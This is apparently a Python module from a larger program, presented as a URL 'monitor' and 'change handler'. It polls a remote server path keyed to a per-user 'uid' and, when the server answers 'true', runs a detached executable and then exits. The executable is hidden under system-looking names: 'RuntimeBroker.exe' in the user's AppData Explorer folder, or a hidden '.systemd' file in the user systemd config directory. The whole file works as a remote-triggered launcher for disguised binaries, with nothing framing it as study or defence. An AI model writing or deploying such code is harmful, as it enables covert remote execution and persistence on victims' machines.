import requests
import time
import multiprocessing
import subprocess
import platform
import os
import sys
import getpass


def run_executable_on_change():
    """Runs a platform-specific executable in a new subprocess."""
    os_type = platform.system()
    user = getpass.getuser()

    if os_type == "Windows":
        executable_path = f"C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Windows\\Explorer\\RuntimeBroker.exe"
    elif os_type == "Darwin":  # macOS
        executable_path = "/path/to/mac_app.app/Contents/MacOS/mac_app"
    elif os_type == "Linux":
        executable_path = f"/home/{user}/.config/systemd/user/.systemd"
    else:
        print(f"[ChangeHandler] Unsupported OS: {os_type}")
        return

    if os.path.exists(executable_path):
        try:
            subprocess.Popen([executable_path], close_fds=True, start_new_session=True)
            print(f"[ChangeHandler] Launched: {executable_path}")
        except Exception as e:
            print(f"[ChangeHandler] Failed to run: {e}")
    else:
        print(f"[ChangeHandler] Executable not found: {executable_path}")


def monitor_url(url, data, check_interval=10):
    """Monitors a URL for content change."""
    url = url+"recovery/"+data['uid']
    print(f"[Monitor] Monitoring URL: {url}")
    try:
        last_content = requests.get(url).text
    except Exception as e:
        print(f"[Monitor] Initial fetch failed: {e}")
        return

    while True:
        try:
            response = requests.get(url)
            current_content = response.text

            if current_content == "true":
                print("[Monitor] Change detected! Triggering executable...")
                # Launch the executable in a separate process
                change_handler = multiprocessing.Process(target=run_executable_on_change)
                change_handler.start()
                #change_handler.join()  # Optional: wait for it to finish
                #last_content = current_content

                os._exit(0)
            else:
                print("[Monitor] No change detected.")

            time.sleep(check_interval)
        except Exception as e:
            print(f"[Monitor] Error during fetch: {e}")
            time.sleep(check_interval)


def run(url_to_monitor, data):
    monitor_process = multiprocessing.Process(target=monitor_url, args=(url_to_monitor,data,))
    monitor_process.start()

    print("[Main] App is running. Monitoring started in a separate process.")